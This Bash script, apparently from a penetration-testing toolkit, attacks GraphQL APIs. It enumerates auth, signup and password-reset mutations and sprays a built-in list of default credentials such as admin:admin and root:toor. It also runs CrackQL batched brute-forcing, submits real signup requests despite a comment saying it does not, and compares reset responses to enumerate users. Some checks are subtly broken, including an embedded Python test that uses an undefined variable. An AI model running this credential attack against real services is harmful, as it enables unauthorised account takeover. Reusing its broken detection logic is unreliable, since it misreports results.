#!/usr/bin/env bash
# ╔══════════════════════════════════════════════════════════════╗
# ║  ap_graphql_brute.sh — GraphQL Credential Testing            ║
# ║  crackql batched auth · default creds · signup mutation ·    ║
# ║  password reset · auth mutation enumeration                  ║
# ╚══════════════════════════════════════════════════════════════╝
set -uo pipefail

SCRIPT_NAME="ap_graphql_brute.sh"
SCRIPT_DESC="GraphQL Credential Testing"

script_usage() {
    echo "Usage: ${SCRIPT_NAME} [OPTIONS]"
    echo ""
    echo "  Test GraphQL authentication mutations with default credentials,"
    echo "  probe signup/register mutations, test password reset flows,"
    echo "  and use crackql for batched auth testing when available."
    echo ""
    echo "Options:"
    echo "  -d, --domain DOMAIN    Target domain"
    echo "  --domains FILE         File with domains (one per line)"
    echo "  -u, --urls FILE        File with GraphQL endpoint URLs"
    echo "  -o, --out DIR          Output directory (default: ./out)"
    echo "  -t, --threads N        Concurrency (default: 30)"
    echo "  -h, --help             Show this help"
}

LIB_DIR="$(cd "$(dirname "$0")/.." && pwd)"
source "${LIB_DIR}/lib.sh"
parse_common_args "$@"

phase_header "3" "$SCRIPT_DESC"

# ── Locate GraphQL endpoints ─────────────────────────────────
ENDPOINTS_FILE=""
if [ -n "${URLS_FILE:-}" ] && [ -f "$URLS_FILE" ]; then
    ENDPOINTS_FILE="$URLS_FILE"
elif [ -f "${OUT_DIR}/ap_graphql_endpoints.txt" ]; then
    ENDPOINTS_FILE="${OUT_DIR}/ap_graphql_endpoints.txt"
else
    err "No GraphQL endpoints found."
    err "  Run ap_graphql_recon.sh first, or provide --urls with GraphQL endpoint URLs."
    script_usage
    exit 1
fi

if [ ! -s "$ENDPOINTS_FILE" ]; then
    warn "Endpoints file is empty: ${ENDPOINTS_FILE}"
    exit 0
fi

ep_count=$(count_lines "$ENDPOINTS_FILE")
info "Loaded ${ep_count} GraphQL endpoint(s) from ${ENDPOINTS_FILE}"

# ── Tool checks ──────────────────────────────────────────────
HAS_CRACKQL=false
if command -v crackql &>/dev/null; then
    HAS_CRACKQL=true
elif [ -f "${BHEH_DIR:-/dev/null}/CrackQL/CrackQL.py" ]; then
    HAS_CRACKQL=true
fi

# ── Output file ──────────────────────────────────────────────
> "${OUT_DIR}/ap_graphql_brute_findings.txt"

# ── Counters ─────────────────────────────────────────────────
CRIT_COUNT=0
HIGH_COUNT=0
MEDIUM_COUNT=0

record_finding() {
    local severity="$1" endpoint="$2" test_name="$3" detail="$4"
    local timestamp
    timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    echo "[${severity}] [${timestamp}] ${test_name} | ${endpoint} | ${detail}" >> "${OUT_DIR}/ap_graphql_brute_findings.txt"
    case "$severity" in
        CRITICAL) ((CRIT_COUNT++)) || true; err "CRITICAL: ${test_name}: ${endpoint}" ;;
        HIGH)     ((HIGH_COUNT++)) || true; warn "HIGH: ${test_name}: ${endpoint}" ;;
        MEDIUM)   ((MEDIUM_COUNT++)) || true; log "MEDIUM: ${test_name}: ${endpoint}" ;;
    esac
}

# ── Default credential pairs ─────────────────────────────────
DEFAULT_CREDS=(
    "admin:admin"
    "admin:password"
    "admin:Password1"
    "admin:123456"
    "admin:admin123"
    "root:root"
    "root:password"
    "root:toor"
    "test:test"
    "user:user"
    "user:password"
    "demo:demo"
    "guest:guest"
    "operator:operator"
    "api:api"
    "developer:developer"
)

# ── Auth mutation name patterns ──────────────────────────────
AUTH_MUTATION_NAMES=(
    "login" "signIn" "signin" "sign_in" "authenticate"
    "auth" "tokenAuth" "createSession" "createToken"
    "generateToken" "obtainToken" "loginUser" "userLogin"
    "adminLogin" "staffLogin" "apiLogin"
)

SIGNUP_MUTATION_NAMES=(
    "signup" "signUp" "sign_up" "register" "createUser"
    "createAccount" "registerUser" "addUser" "newUser"
    "userRegister" "userSignup"
)

RESET_MUTATION_NAMES=(
    "resetPassword" "reset_password" "forgotPassword" "forgot_password"
    "sendResetEmail" "requestPasswordReset" "passwordReset"
    "changePassword" "change_password" "updatePassword"
)

# ══════════════════════════════════════════════════════════════
# Process each endpoint
# ══════════════════════════════════════════════════════════════
while IFS= read -r gql_url; do
    [ -z "$gql_url" ] && continue
    info "Testing: ${gql_url}"
    echo "--- ${gql_url} ---" >> "${OUT_DIR}/ap_graphql_brute_findings.txt"

    # ══════════════════════════════════════════════════════════
    # Step 1: Discover authentication mutations
    # ══════════════════════════════════════════════════════════
    info "  [1/5] Discovering auth mutations..."

    found_auth_mutations=()
    found_signup_mutations=()
    found_reset_mutations=()

    # Check saved schema from phase 1
    schema_file="${OUT_DIR}/ap_graphql_schema_${gql_url//[^a-zA-Z0-9]/_}.json"
    if [ -f "$schema_file" ] && [ -s "$schema_file" ]; then
        while IFS= read -r mname; do
            [ -z "$mname" ] && continue
            mname_lower=$(echo "$mname" | tr '[:upper:]' '[:lower:]')
            if echo "$mname_lower" | grep -qE '(login|signin|auth|token|session|authenticate)'; then
                found_auth_mutations+=("$mname")
            elif echo "$mname_lower" | grep -qE '(signup|register|createuser|createaccount|adduser|newuser)'; then
                found_signup_mutations+=("$mname")
            elif echo "$mname_lower" | grep -qE '(reset.*pass|forgot.*pass|change.*pass|update.*pass)'; then
                found_reset_mutations+=("$mname")
            fi
        done < <(python3 -c "
import json, sys
try:
    d = json.load(open(sys.argv[1]))
    mt = d.get('data', {}).get('__schema', {}).get('mutationType', {})
    if mt and mt.get('fields'):
        for f in mt['fields']:
            print(f['name'])
except: pass
" "$schema_file" 2>/dev/null)
    fi

    # Probe for auth mutations if none found from schema
    if [ ${#found_auth_mutations[@]} -eq 0 ]; then
        for mut_name in "${AUTH_MUTATION_NAMES[@]}"; do
            probe_resp=$(curl -sk --connect-timeout 8 --max-time 15 "${HUNT_UA_CURL[@]}" \
                -X POST -H "Content-Type: application/json" \
                -d "{\"query\":\"mutation { ${mut_name}(input: {}) { __typename } }\"}" \
                "$gql_url" 2>/dev/null || echo "")

            if echo "$probe_resp" | python3 -c "
import json, sys
try:
    d = json.load(sys.stdin)
    for e in d.get('errors', []):
        msg = e.get('message', '').lower()
        # Field exists if error is about arguments, not about field not existing
        if 'argument' in msg or 'required' in msg or 'variable' in msg or 'field' in msg.split('cannot')[0] if 'cannot' in msg else False:
            sys.exit(0)
        if 'password' in msg or 'email' in msg or 'username' in msg:
            sys.exit(0)
        if 'cannot query' in msg or 'does not exist' in msg or 'unknown field' in msg:
            sys.exit(1)
    # Also check if data was returned (unprotected mutation)
    if d.get('data', {}).get('${mut_name}') is not None:
        sys.exit(0)
except: pass
sys.exit(1)
" 2>/dev/null; then
                found_auth_mutations+=("$mut_name")
                log "    Auth mutation found: ${mut_name}"
            fi
        done
    fi

    # Probe for signup mutations
    if [ ${#found_signup_mutations[@]} -eq 0 ]; then
        for mut_name in "${SIGNUP_MUTATION_NAMES[@]}"; do
            probe_resp=$(curl -sk --connect-timeout 8 --max-time 15 "${HUNT_UA_CURL[@]}" \
                -X POST -H "Content-Type: application/json" \
                -d "{\"query\":\"mutation { ${mut_name}(input: {}) { __typename } }\"}" \
                "$gql_url" 2>/dev/null || echo "")

            if echo "$probe_resp" | python3 -c "
import json, sys
try:
    d = json.load(sys.stdin)
    for e in d.get('errors', []):
        msg = e.get('message', '').lower()
        if 'argument' in msg or 'required' in msg or 'variable' in msg:
            sys.exit(0)
        if 'cannot query' in msg or 'does not exist' in msg or 'unknown field' in msg:
            sys.exit(1)
    if d.get('data', {}).get('${mut_name}') is not None:
        sys.exit(0)
except: pass
sys.exit(1)
" 2>/dev/null; then
                found_signup_mutations+=("$mut_name")
                log "    Signup mutation found: ${mut_name}"
            fi
        done
    fi

    # Probe for reset mutations
    if [ ${#found_reset_mutations[@]} -eq 0 ]; then
        for mut_name in "${RESET_MUTATION_NAMES[@]}"; do
            probe_resp=$(curl -sk --connect-timeout 8 --max-time 15 "${HUNT_UA_CURL[@]}" \
                -X POST -H "Content-Type: application/json" \
                -d "{\"query\":\"mutation { ${mut_name}(input: {}) { __typename } }\"}" \
                "$gql_url" 2>/dev/null || echo "")

            if echo "$probe_resp" | python3 -c "
import json, sys
try:
    d = json.load(sys.stdin)
    for e in d.get('errors', []):
        msg = e.get('message', '').lower()
        if 'argument' in msg or 'required' in msg or 'variable' in msg:
            sys.exit(0)
        if 'cannot query' in msg or 'does not exist' in msg or 'unknown field' in msg:
            sys.exit(1)
    if d.get('data', {}).get('${mut_name}') is not None:
        sys.exit(0)
except: pass
sys.exit(1)
" 2>/dev/null; then
                found_reset_mutations+=("$mut_name")
                log "    Reset mutation found: ${mut_name}"
            fi
        done
    fi

    info "  Found: ${#found_auth_mutations[@]} auth, ${#found_signup_mutations[@]} signup, ${#found_reset_mutations[@]} reset mutations"

    # ══════════════════════════════════════════════════════════
    # Step 2: Test default credentials against auth mutations
    # ══════════════════════════════════════════════════════════
    info "  [2/5] Testing default credentials..."

    for auth_mut in "${found_auth_mutations[@]+"${found_auth_mutations[@]}"}"; do
        [ -z "$auth_mut" ] && continue
        info "    Testing mutation: ${auth_mut}"

        # Common input field patterns for login mutations
        input_patterns=(
            "{\"query\":\"mutation { ${auth_mut}(username: \\\"USER\\\", password: \\\"PASS\\\") { __typename } }\"}"
            "{\"query\":\"mutation { ${auth_mut}(email: \\\"USER\\\", password: \\\"PASS\\\") { __typename } }\"}"
            "{\"query\":\"mutation { ${auth_mut}(input: {username: \\\"USER\\\", password: \\\"PASS\\\"}) { __typename } }\"}"
            "{\"query\":\"mutation { ${auth_mut}(input: {email: \\\"USER\\\", password: \\\"PASS\\\"}) { __typename } }\"}"
            "{\"query\":\"mutation { ${auth_mut}(credentials: {username: \\\"USER\\\", password: \\\"PASS\\\"}) { __typename } }\"}"
        )

        # First, figure out which input pattern works by trying a known-bad credential
        working_pattern=""
        for pattern in "${input_patterns[@]}"; do
            test_payload=$(echo "$pattern" | sed "s/USER/testinvalid_$$_probe/g;s/PASS/testinvalid_$$_probe/g")
            test_resp=$(curl -sk --connect-timeout 8 --max-time 15 "${HUNT_UA_CURL[@]}" \
                -X POST -H "Content-Type: application/json" \
                -d "$test_payload" \
                "$gql_url" 2>/dev/null || echo "")

            # If we get an auth error (not a syntax/field error), this pattern works
            if echo "$test_resp" | python3 -c "
import json, sys
try:
    d = json.load(sys.stdin)
    errors = d.get('errors', [])
    for e in errors:
        msg = e.get('message', '').lower()
        if any(kw in msg for kw in ['invalid', 'incorrect', 'wrong', 'unauthorized', 'denied', 'failed', 'bad', 'not found', 'credentials']):
            sys.exit(0)
        # Syntax/field errors mean wrong pattern
        if 'argument' in msg or 'unknown' in msg or 'field' in msg:
            sys.exit(1)
    # If data is returned (null or object), the pattern is valid
    data = d.get('data', {})
    if data is not None and auth_mut in str(data):
        sys.exit(0)
except: pass
sys.exit(1)
" 2>/dev/null; then
                working_pattern="$pattern"
                break
            fi
        done

        if [ -z "$working_pattern" ]; then
            info "      Could not determine input pattern for ${auth_mut}"
            continue
        fi

        # Test each credential pair
        for cred in "${DEFAULT_CREDS[@]}"; do
            user="${cred%%:*}"
            pass="${cred#*:}"

            login_payload=$(echo "$working_pattern" | sed "s/USER/${user}/g;s/PASS/${pass}/g")
            login_resp=$(curl -sk --connect-timeout 8 --max-time 15 "${HUNT_UA_CURL[@]}" \
                -X POST -H "Content-Type: application/json" \
                -d "$login_payload" \
                "$gql_url" 2>/dev/null || echo "")

            # Check for successful auth indicators
            if echo "$login_resp" | python3 -c "
import json, sys
try:
    d = json.load(sys.stdin)
    # Check for token/session in response
    resp_str = json.dumps(d).lower()
    data = d.get('data', {})
    if data:
        data_str = json.dumps(data).lower()
        # Success: token, jwt, session, accessToken in response data
        if any(kw in data_str for kw in ['token', 'jwt', 'session', 'access', 'bearer', 'refresh']):
            if not any(kw in data_str for kw in ['null', 'invalid', 'error', 'failed']):
                sys.exit(0)
    # Check for absence of errors (success with data)
    errors = d.get('errors', [])
    if not errors and data:
        # Has data, no errors — likely success
        vals = [v for v in data.values() if v is not None]
        if vals:
            sys.exit(0)
except: pass
sys.exit(1)
" 2>/dev/null; then
                record_finding "CRITICAL" "$gql_url" "Default Credentials" \
                    "Auth mutation '${auth_mut}' accepts ${user}:${pass} — token/session returned"
                break  # Stop testing more creds for this mutation
            fi
        done
    done

    # ══════════════════════════════════════════════════════════
    # Step 3: CrackQL batched auth testing
    # ══════════════════════════════════════════════════════════
    if $HAS_CRACKQL && [ ${#found_auth_mutations[@]} -gt 0 ]; then
        info "  [3/5] Running CrackQL batched auth testing..."

        for auth_mut in "${found_auth_mutations[@]}"; do
            [ -z "$auth_mut" ] && continue

            # Create a temp CSV with credentials
            cred_csv=$(mktemp --suffix=.csv)
            echo "username,password" > "$cred_csv"
            for cred in "${DEFAULT_CREDS[@]}"; do
                user="${cred%%:*}"
                pass="${cred#*:}"
                echo "${user},${pass}" >> "$cred_csv"
            done

            # Create the GraphQL query template for CrackQL
            query_template=$(mktemp --suffix=.graphql)
            echo "mutation { ${auth_mut}(username: \"{{username}}\", password: \"{{password}}\") { __typename } }" > "$query_template"

            crackql_out="${OUT_DIR}/ap_crackql_${auth_mut}.json"

            if command -v crackql &>/dev/null; then
                crackql -t "$gql_url" -q "$query_template" -i "$cred_csv" -o "$crackql_out" 2>/dev/null || true
            elif [ -f "${BHEH_DIR}/CrackQL/CrackQL.py" ]; then
                python3 "${BHEH_DIR}/CrackQL/CrackQL.py" -t "$gql_url" -q "$query_template" -i "$cred_csv" -o "$crackql_out" 2>/dev/null || true
            fi

            if [ -s "$crackql_out" ]; then
                # Parse CrackQL results for successful auths
                success_count=$(python3 -c "
import json, sys
try:
    d = json.load(open(sys.argv[1]))
    successes = 0
    for result in d if isinstance(d, list) else [d]:
        data = result.get('data', {})
        errors = result.get('errors', [])
        if data and not errors:
            data_str = json.dumps(data).lower()
            if any(kw in data_str for kw in ['token', 'jwt', 'session', 'access']):
                successes += 1
    print(successes)
except: print(0)
" "$crackql_out" 2>/dev/null || echo "0")

                if [ "${success_count:-0}" -gt 0 ]; then
                    record_finding "CRITICAL" "$gql_url" "CrackQL Batched Auth" \
                        "CrackQL found ${success_count} valid credential(s) via batched mutation '${auth_mut}'"
                fi
            fi

            rm -f "$cred_csv" "$query_template"
        done
    else
        info "  [3/5] CrackQL not available — skipping batched auth testing"
    fi

    # ══════════════════════════════════════════════════════════
    # Step 4: Test signup mutations for account creation
    # ══════════════════════════════════════════════════════════
    info "  [4/5] Testing signup mutations..."

    for signup_mut in "${found_signup_mutations[@]+"${found_signup_mutations[@]}"}"; do
        [ -z "$signup_mut" ] && continue
        info "    Testing: ${signup_mut}"

        # Try to create an account — DO NOT actually submit, just check if mutation accepts input
        # Use obviously-test values
        signup_patterns=(
            "{\"query\":\"mutation { ${signup_mut}(username: \\\"security_test_probe\\\", email: \\\"noreply@test.invalid\\\", password: \\\"TestProbe123!\\\") { __typename } }\"}"
            "{\"query\":\"mutation { ${signup_mut}(input: {username: \\\"security_test_probe\\\", email: \\\"noreply@test.invalid\\\", password: \\\"TestProbe123!\\\"}) { __typename } }\"}"
            "{\"query\":\"mutation { ${signup_mut}(email: \\\"noreply@test.invalid\\\", password: \\\"TestProbe123!\\\") { __typename } }\"}"
        )

        for pattern in "${signup_patterns[@]}"; do
            signup_resp=$(curl -sk --connect-timeout 8 --max-time 15 "${HUNT_UA_CURL[@]}" \
                -X POST -H "Content-Type: application/json" \
                -d "$pattern" \
                "$gql_url" 2>/dev/null || echo "")

            # Check if the mutation processed the request (not a field/syntax error)
            if echo "$signup_resp" | python3 -c "
import json, sys
try:
    d = json.load(sys.stdin)
    data = d.get('data', {})
    errors = d.get('errors', [])
    # Success if we got data back
    if data and any(v is not None for v in data.values()):
        print('CREATED')
        sys.exit(0)
    # Check errors for business logic errors (means mutation exists and processes input)
    for e in errors:
        msg = e.get('message', '').lower()
        if any(kw in msg for kw in ['already exists', 'duplicate', 'taken', 'in use', 'registered', 'email', 'weak password', 'password too', 'captcha', 'rate limit']):
            print('EXISTS_BUT_WORKS')
            sys.exit(0)
except: pass
sys.exit(1)
" 2>/dev/null; then
                signup_result=$(echo "$signup_resp" | python3 -c "
import json, sys
try:
    d = json.load(sys.stdin)
    data = d.get('data', {})
    if data and any(v is not None for v in data.values()):
        print('CREATED')
    else:
        print('EXISTS_BUT_WORKS')
except: print('UNKNOWN')
" 2>/dev/null || echo "UNKNOWN")

                if [ "$signup_result" = "CREATED" ]; then
                    record_finding "HIGH" "$gql_url" "Unprotected Signup" \
                        "Signup mutation '${signup_mut}' creates accounts without protection (CAPTCHA/rate limit)"
                else
                    record_finding "MEDIUM" "$gql_url" "Signup Mutation Accessible" \
                        "Signup mutation '${signup_mut}' processes requests — may lack rate limiting"
                fi
                break  # Found working pattern
            fi
        done
    done

    # ══════════════════════════════════════════════════════════
    # Step 5: Test password reset mutations
    # ══════════════════════════════════════════════════════════
    info "  [5/5] Testing password reset mutations..."

    for reset_mut in "${found_reset_mutations[@]+"${found_reset_mutations[@]}"}"; do
        [ -z "$reset_mut" ] && continue
        info "    Testing: ${reset_mut}"

        reset_patterns=(
            "{\"query\":\"mutation { ${reset_mut}(email: \\\"noreply@test.invalid\\\") { __typename } }\"}"
            "{\"query\":\"mutation { ${reset_mut}(input: {email: \\\"noreply@test.invalid\\\"}) { __typename } }\"}"
            "{\"query\":\"mutation { ${reset_mut}(username: \\\"admin\\\") { __typename } }\"}"
        )

        for pattern in "${reset_patterns[@]}"; do
            reset_resp=$(curl -sk --connect-timeout 8 --max-time 15 "${HUNT_UA_CURL[@]}" \
                -X POST -H "Content-Type: application/json" \
                -d "$pattern" \
                "$gql_url" 2>/dev/null || echo "")

            if echo "$reset_resp" | python3 -c "
import json, sys
try:
    d = json.load(sys.stdin)
    data = d.get('data', {})
    errors = d.get('errors', [])
    # Success or business logic error (not syntax error)
    if data and any(v is not None for v in data.values()):
        sys.exit(0)
    for e in errors:
        msg = e.get('message', '').lower()
        if any(kw in msg for kw in ['not found', 'no user', 'invalid email', 'sent', 'success', 'rate limit', 'too many']):
            sys.exit(0)
        if 'argument' in msg or 'unknown' in msg or 'field' in msg:
            sys.exit(1)
except: pass
sys.exit(1)
" 2>/dev/null; then
                # Test for user enumeration via reset
                admin_reset=$(curl -sk --connect-timeout 8 --max-time 15 "${HUNT_UA_CURL[@]}" \
                    -X POST -H "Content-Type: application/json" \
                    -d "$(echo "$pattern" | sed 's/noreply@test.invalid/admin@test.invalid/;s/admin/admin/')" \
                    "$gql_url" 2>/dev/null || echo "")

                fake_reset=$(curl -sk --connect-timeout 8 --max-time 15 "${HUNT_UA_CURL[@]}" \
                    -X POST -H "Content-Type: application/json" \
                    -d "$(echo "$pattern" | sed 's/noreply@test.invalid/nonexistent_user_xyz_987@test.invalid/;s/admin/nonexistent_user_xyz_987/')" \
                    "$gql_url" 2>/dev/null || echo "")

                # Compare responses for user enumeration
                if [ "$admin_reset" != "$fake_reset" ] && [ -n "$admin_reset" ] && [ -n "$fake_reset" ]; then
                    admin_size=${#admin_reset}
                    fake_size=${#fake_reset}
                    size_diff=$(( admin_size - fake_size ))
                    [ "$size_diff" -lt 0 ] && size_diff=$(( -size_diff ))

                    if [ "$size_diff" -gt 20 ]; then
                        record_finding "MEDIUM" "$gql_url" "User Enumeration via Reset" \
                            "Password reset mutation '${reset_mut}' reveals user existence (response size diff: ${size_diff} bytes)"
                    fi
                fi

                record_finding "LOW" "$gql_url" "Reset Mutation Accessible" \
                    "Password reset mutation '${reset_mut}' is accessible — verify rate limiting"
                break
            fi
        done
    done

done < "$ENDPOINTS_FILE"

# ══════════════════════════════════════════════════════════════
# Summary
# ══════════════════════════════════════════════════════════════
total_findings=$(count_lines "${OUT_DIR}/ap_graphql_brute_findings.txt")

echo ""
log "GraphQL credential testing complete: ${ep_count} endpoint(s) tested"
log "  CRITICAL: ${CRIT_COUNT}"
log "  HIGH:     ${HIGH_COUNT}"
log "  MEDIUM:   ${MEDIUM_COUNT}"
log "  Total:    ${total_findings} findings → ${OUT_DIR}/ap_graphql_brute_findings.txt"

if [ "$CRIT_COUNT" -gt 0 ]; then
    echo ""
    err "CRITICAL findings — valid credentials discovered:"
    grep '^\[CRITICAL\]' "${OUT_DIR}/ap_graphql_brute_findings.txt" 2>/dev/null | while IFS= read -r line; do
        err "  ${line}"
    done
fi
